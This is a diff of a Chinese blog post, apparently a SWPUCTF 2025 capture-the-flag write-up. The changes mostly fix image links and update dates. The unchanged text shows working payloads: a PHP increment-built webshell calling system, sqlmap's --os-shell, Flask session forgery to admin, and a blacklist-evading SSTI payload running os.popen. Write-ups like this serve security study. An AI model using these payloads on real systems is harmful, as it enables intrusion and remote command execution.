@@ -43,13 +43,29 @@
 <meta property="og:description" content="ezez_include（文件包含） 进入题目之后，是一个文件访问页面，随便在表单里面提交点东西,发现文件包含漏洞 扫描一下目录  1python dirsearch.py -u http:&#x2F;&#x2F;node1.anna.nssctf.cn:29015 -e php -t 1 -d 3 发现upload.php,是一个文件上传接口，成功上传123.jpg3. 知道文件访问页面可以进行文件包含，但是不知道">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://chq576.github.io/img/in.png">
+<meta property="og:image" content="https://chq576.github.io/img/bb5.png">
+<meta property="og:image" content="https://chq576.github.io/img/bb2.png">
+<meta property="og:image" content="https://chq576.github.io/img/bb1.png">
+<meta property="og:image" content="https://chq576.github.io/img/bb3.png">
+<meta property="og:image" content="https://chq576.github.io/img/bb4.png">
 <meta property="og:image" content="https://chq576.github.io/img/321.png">
+<meta property="og:image" content="https://chq576.github.io/img/a1.png">
+<meta property="og:image" content="https://chq576.github.io/img/a2.png">
+<meta property="og:image" content="https://chq576.github.io/img/a3.png">
 <meta property="og:image" content="https://chq576.github.io/img/a.png">
+<meta property="og:image" content="https://chq576.github.io/img/d1.png">
+<meta property="og:image" content="https://chq576.github.io/img/d2.png">
+<meta property="og:image" content="https://chq576.github.io/img/d4.png">
+<meta property="og:image" content="https://chq576.github.io/img/d3.png">
+<meta property="og:image" content="https://chq576.github.io/img/d5.png">
+<meta property="og:image" content="https://chq576.github.io/img/d7.png">
+<meta property="og:image" content="https://chq576.github.io/img/e2.png">
+<meta property="og:image" content="https://chq576.github.io/img/e1png">
 <meta property="og:image" content="https://chq576.github.io/img/wawa.png">
 <meta property="og:image" content="https://chq576.github.io/img/666.png">
 <meta property="og:image" content="https://chq576.github.io/img/5656.png">
 <meta property="article:published_time" content="2026-03-19T11:00:09.307Z">
-<meta property="article:modified_time" content="2026-03-27T05:25:19.140Z">
+<meta property="article:modified_time" content="2026-03-28T03:20:44.858Z">
 <meta property="article:author" content="cc">
 <meta property="article:tag" content="章鱼哥喜欢海绵宝宝">
 <meta name="twitter:card" content="summary">
@@ -345,7 +361,7 @@
       <div class="article-date">
   <span class="article-date-link icon-calendar" data-aos="zoom-in">
     <time datetime="2026-03-19T11:00:09.307Z" itemprop="datePublished">2026-03-19</time>
-    <time style="display: none;" id="post-update-time">2026-03-27</time>
+    <time style="display: none;" id="post-update-time">2026-03-28</time>
   </span>
   
 </div>
@@ -365,27 +381,27 @@
 <li>扫描一下目录</li>
 </ol>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u http://node1.anna.nssctf.cn:29015 -e php -t 1 -d 3</span><br></pre></td></tr></table></figure>
-<p>发现upload.php,是一个文件上传接口，成功上传123.jpg<br>3. 知道文件访问页面可以进行文件包含，但是不知道怎么样才可以触发文件包含漏洞，抓个包试试<br>![图片](.&#x2F;img&#x2F;bb (5).png)<br>![图片](.&#x2F;img&#x2F;bb (2).png)<br>![图片](.&#x2F;img&#x2F;bb (1).png)<br>![图片](.&#x2F;img&#x2F;bb (3).png)<br>![图片](.&#x2F;img&#x2F;bb (4).png)</p>
+<p>发现upload.php,是一个文件上传接口，成功上传123.jpg<br>3. 知道文件访问页面可以进行文件包含，但是不知道怎么样才可以触发文件包含漏洞，抓个包试试<br><img src="/./img/bb5.png" alt="图片"><br><img src="/./img/bb2.png" alt="图片"><br><img src="/./img/bb1.png" alt="图片"><br><img src="/./img/bb3.png" alt="图片"><br><img src="/./img/bb4.png" alt="图片"></p>
 <h1 id="php命令执行-PHP自增特性-RCE"><a href="#php命令执行-PHP自增特性-RCE" class="headerlink" title="php命令执行(PHP自增特性 RCE)"></a>php命令执行(PHP自增特性 RCE)</h1><p>[自增构造webshell]<a target="_blank" rel="noopener" href="http://cloud.tencent.com/developer/article/2288274">http://cloud.tencent.com/developer/article/2288274</a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (isset($_POST[&#x27;rce&#x27;])) &#123;</span><br><span class="line">    $rce = $_POST[&#x27;rce&#x27;];</span><br><span class="line">    if (strlen($rce) &lt;= 200) &#123;</span><br><span class="line">        if (preg_match(&quot;/[!@#%^&amp;*:&#x27;\-&lt;?&gt;\&quot;\/|`a-zA-Z~\\\\0-9]/&quot;, $rce)) &#123;</span><br><span class="line">            echo &quot;Are you hack me?&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            eval($rce);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;too long!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>|类别|具体被限制的字符|<br>|—|—|	<br>|特殊符号|	<code>! @ # % ^ &amp; * : &#39; - &lt; &gt; ? &quot; /	`` </code>|	<br>|字母|	a-z（小写）、A-Z（大写）|	<br>|数字|	0-9	所有数字全被禁止|	<br>|其他符号|	~（波浪号）、\（反斜杠）	\\ 是正则中对 \ 的转义（实际禁止的是 \）|	</p>
 <p>没有被禁的<br>部分特殊符号：_（下划线）、+（加号）、&#x3D;（等号）、(（左括号）、)（右括号）、,（逗号）、.（点）、;（分号）、$（美元符）、[（左中括号）、]（右中括号）、{（左大括号）、}（右大括号）等；<br>根据字符自增构造payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=[]._;$_=$_[_];$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__=$_;$___=$__++;$_++;$_++;$_++;$_++;$____=$_;$_____=++$_;$_=_.$__.$___.$____.$_____;$$_[_]($$_[__]);&amp;_=system&amp;__=nl /f*</span><br></pre></td></tr></table></figure>
 <p><img src="/./img/321.png" alt="图片"></p>
-<h1 id="sql仅仅只是sql吗？"><a href="#sql仅仅只是sql吗？" class="headerlink" title="sql仅仅只是sql吗？"></a>sql仅仅只是sql吗？</h1><p>![图片](.&#x2F;img&#x2F;a (1).png)a<br>![图片](.&#x2F;img&#x2F;a (2).png)<br>![图片](.&#x2F;img&#x2F;a (3).png)<br>发现假的flag,sqlmap有一个命令</p>
+<h1 id="sql仅仅只是sql吗？"><a href="#sql仅仅只是sql吗？" class="headerlink" title="sql仅仅只是sql吗？"></a>sql仅仅只是sql吗？</h1><p><img src="/./img/a1.png" alt="图片">a<br><img src="/./img/a2.png" alt="图片"><br><img src="/./img/a3.png" alt="图片"><br>发现假的flag,sqlmap有一个命令</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://example.com/page.php?id=1&quot; --os-shell</span><br></pre></td></tr></table></figure>
 <ul>
 <li>在 ‌sqlmap‌ 中，–os-shell 是一个用于在成功利用 SQL 注入漏洞后，‌获取目标服务器交互式命令行 shell‌ 的高级功能。</li>
 <li>使用前提条件‌：数据库权限：网站数据库账户必须是root或具有高级权限；路径知识：攻击者需要知道网站的绝对路径；GPC设置：PHP的GPC（Get&#x2F;Post&#x2F;Cookie）主动转义功能必须关闭；文件权限：MySQL的secure_file_priv参数必须无限制或设置适当<br><img src="/./img/a.png" alt="图片"></li>
 </ul>
 <h1 id="我是复读机-session造假-ssti"><a href="#我是复读机-session造假-ssti" class="headerlink" title="我是复读机(session造假 ssti)"></a>我是复读机(session造假 ssti)</h1><ol>
-<li>打开页面，发现不能查看查看源码，跳转之about:config里面关掉javascript<br>![图片](.&#x2F;img&#x2F;d (1).png)</li>
+<li>打开页面，发现不能查看查看源码，跳转之about:config里面关掉javascript<br><img src="/./img/d1.png" alt="图片"></li>
 <li>查看源码，发现隐藏的文件robots.txt,内容如下：</li>
 </ol>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /Up1oAds</span><br></pre></td></tr></table></figure>
-<p>![图片](.&#x2F;img&#x2F;d (2).png)<br>3. 跳转至&#x2F;Up1oAds，继续查看源码，有一个&#x2F;render渲染页面，猜测是ssti,接下来在复读框里面输入</p>
+<p><img src="/./img/d2.png" alt="图片"><br>3. 跳转至&#x2F;Up1oAds，继续查看源码，有一个&#x2F;render渲染页面，猜测是ssti,接下来在复读框里面输入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>![图片](.&#x2F;img&#x2F;d (4).png)<br>4. 跳转至&#x2F;forbiden2页面,显示权限不足，继续查看源码<br>![图片](.&#x2F;img&#x2F;d (3).png)<br>![图片](.&#x2F;img&#x2F;d (5).png)<br>发现给出了密钥，抓个包，在session里面提取第一部分的内容，base64解码为{“user”:”guest”}<br>改为{“user”:’admin”}之后重新生成新的session,替换数据包里的seesion<br>![图片](.&#x2F;img&#x2F;d (7).png)<br>![图片](.&#x2F;img&#x2F;e (2).png)<br>5. 成功获得管理员权限后,爆破一下黑名单<br>![图片](.&#x2F;img&#x2F;e (1).png)</p>
+<p><img src="/./img/d4.png" alt="图片"><br>4. 跳转至&#x2F;forbiden2页面,显示权限不足，继续查看源码<br><img src="/./img/d3.png" alt="图片"><br><img src="/./img/d5.png" alt="图片"><br>发现给出了密钥，抓个包，在session里面提取第一部分的内容，base64解码为{“user”:”guest”}<br>改为{“user”:’admin”}之后重新生成新的session,替换数据包里的seesion<br><img src="/./img/d7.png" alt="图片"><br><img src="/./img/e2.png" alt="图片"><br>5. 成功获得管理员权限后,爆破一下黑名单<br><img src="/./img/e1png" alt="图片"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;g[&#x27;po&#x27;&#x27;p&#x27;][&#x27;__g&#x27;&#x27;lobals__&#x27;][&#x27;__b&#x27;&#x27;uiltins__&#x27;][&#x27;__imp&#x27;&#x27;ort__&#x27;](&#x27;o&#x27;&#x27;s&#x27;)[&#x27;po&#x27;&#x27;pen&#x27;](&#x27;cat /f*&#x27;)[&#x27;r&#x27;&#x27;ead&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>1.从上下文对象 g 中拿到 pop 属性；<br>2.通过 <strong>globals</strong> 拿到全局命名空间；<br>3.从全局命名空间中拿到内置方法字典 <strong>builtins</strong>；<br>4.调用 <strong>import</strong> 导入 os 模块；<br>5.用 os.popen() 执行 cat &#x2F;f* 系统命令；<br>6.调用 read() 读取命令执行结果（最终拿到 &#x2F;f 开头文件的内容）。</p>
@@ -435,7 +451,7 @@
     <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://chq576.github.io/2026/03/19/SWPUCTF-2025/">https://chq576.github.io/2026/03/19/SWPUCTF-2025/</a></p>
     <p><strong><span class="icon-pencil icon"></span>Title: </strong>「SWPUCTF 2025」</p>
     <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-03-19 19:00:09</p>
-    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-03-27 13:25:19</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-03-28 11:20:44</p>
     <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
     <span class="icon-creative-commons article-copyright-bg"></span>
   </blockquote>
@@ -556,10 +572,10 @@
     
       <div>
         <span class="icon-brush"></span>
-        37.6k
+        39.6k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        03:04
+        03:13
       </div>
     
     
@@ -756,9 +772,9 @@
           url: "https://chq576.github.io/2026/03/19/SWPUCTF-2025/",
           excerpt: "",
           description: "",
-          stripContent: "ezez_include（文件包含） 进入题目之后，是一个文件访问页面，随便在表单里面提交点东西,发现文件包含漏洞 扫描一下目录  1python dirsearch.py -u http://node1.anna.nssctf.cn:29015 -e php -t 1 -d 3 发现upload.php,是一个文件上传接口，成功上传123.jpg3. 知道文件访问页面可以进行文件包含，但是不知道怎么样才可以触发文件包含漏洞，抓个包试试![图片](.&amp;#x2F;img&amp;#x2F;bb (5).p",
+          stripContent: "ezez_include（文件包含） 进入题目之后，是一个文件访问页面，随便在表单里面提交点东西,发现文件包含漏洞 扫描一下目录  1python dirsearch.py -u http://node1.anna.nssctf.cn:29015 -e php -t 1 -d 3 发现upload.php,是一个文件上传接口，成功上传123.jpg3. 知道文件访问页面可以进行文件包含，但是不知道怎么样才可以触发文件包含漏洞，抓个包试试 php命令执行(PHP自增特性 RCE)[自增构造webs",
           date: "Thu Mar 19 2026 19:00:09 GMT+0800",
-          updated: "Fri Mar 27 2026 13:25:19 GMT+0800",
+          updated: "Sat Mar 28 2026 11:20:44 GMT+0800",
           cover: "/images/cc.jpg",
         };
       </script>
